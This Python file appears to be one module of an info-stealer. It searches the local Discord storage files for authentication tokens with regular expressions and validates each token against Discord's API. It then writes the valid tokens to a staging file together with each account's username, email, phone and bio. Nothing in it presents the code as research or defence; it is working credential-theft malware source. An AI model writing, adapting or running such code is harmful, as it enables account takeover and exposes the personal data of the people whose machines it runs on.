from re import findall
from json import loads
from os import listdir, path, mkdir

from ..utils.config import http, DiscordConfig


class Discord:

    def __init__(self, *args):

        self.config = DiscordConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        if not path.exists(rf"{self.storage_path}\{self.storage_folder}\{self.folder}"):
            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.folder}")

    def __check_tokens(self):

        if path.exists(self.config.TokensPath):
            self.__create_folder()
            self.__get_tokens()

    def __get_headers(self, token: str = None, content_type: str = "application/json"):

        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
        }
        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __get_tokens(self):

        valid = []
        invalid = []

        for file in listdir(self.config.TokensPath):
            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [line.strip() for line in open(rf"{self.config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    try:
                        [valid.append(request) if request[1].status == 200 else invalid.append(request) for request in
                            [(token,
                                http.request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token)))
                                for token in findall(regex, data)
                            ]
                        ]
                    except:
                        continue

        with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord.txt", "a", encoding="utf-8") as discord:

            discord.write("Invalid tokens:\n" + "\n".join(item[0] for item in invalid) + "\n\nValid tokens:\n")

            for result in valid:

                data = loads(result[1].data.decode())

                info = (
                    f"Username: {data['username'] if data['username'] else 'No data'}",
                    f"Email: {data['email'] if data['email'] else 'No data'}",
                    f"Phone: {data['phone'] if data['phone'] else 'No data'}",
                    f"Bio: {data['bio'] if data['bio'] else 'No data'}",
                    f"Token: {result[0]}",
                )

                discord.write("\n".join(item for item in info) + "\n\n")

        discord.close()

    def run(self):

        try:

            if self.statuses[0] is True:

                self.__check_tokens()

        except Exception as e:

            if self.errors is True:
                print(f"[DISCORD]: {repr(e)}")